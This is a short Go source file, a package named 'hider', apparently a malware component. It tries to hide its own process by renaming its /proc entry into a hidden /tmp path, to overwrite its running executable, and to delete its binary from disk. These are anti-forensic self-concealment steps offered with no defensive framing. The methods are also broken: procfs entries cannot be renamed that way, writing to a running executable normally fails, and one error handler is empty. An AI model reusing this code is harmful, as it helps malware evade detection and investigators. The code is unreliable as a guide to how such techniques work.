package hider

import (
	"fmt"
	"os"
	"strconv"
)

func Hide() error {
	err := hideProcess()
	if err != nil {
		return fmt.Errorf("error hiding process: %v", err)
	}
	err = overwriteExecutable()
	if err != nil {
		return fmt.Errorf("error overwriting executable: %v", err)
	}
	err = deleteSelf()
	if err != nil {
		return fmt.Errorf("error deleting self: %v", err)
	}
	return nil
}

func hideProcess() error {
	pid := os.Getpid()
	newName := "/tmp/." + strconv.Itoa(pid)
	oldPath := "/proc/" + strconv.Itoa(pid)
	if err := os.Rename(oldPath, newName); err != nil {
		return err
	}
	return nil
}

func overwriteExecutable() error {
	f, err := os.OpenFile("/proc/self/exe", os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer func(f *os.File) {
		err := f.Close()
		if err != nil {

		}
	}(f)

	_, err = f.Write([]byte(" "))
	if err != nil {
		return err
	}
	return nil
}

func deleteSelf() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}

	err = os.Remove(exe)
	if err != nil {
		return err
	}
	return nil
}
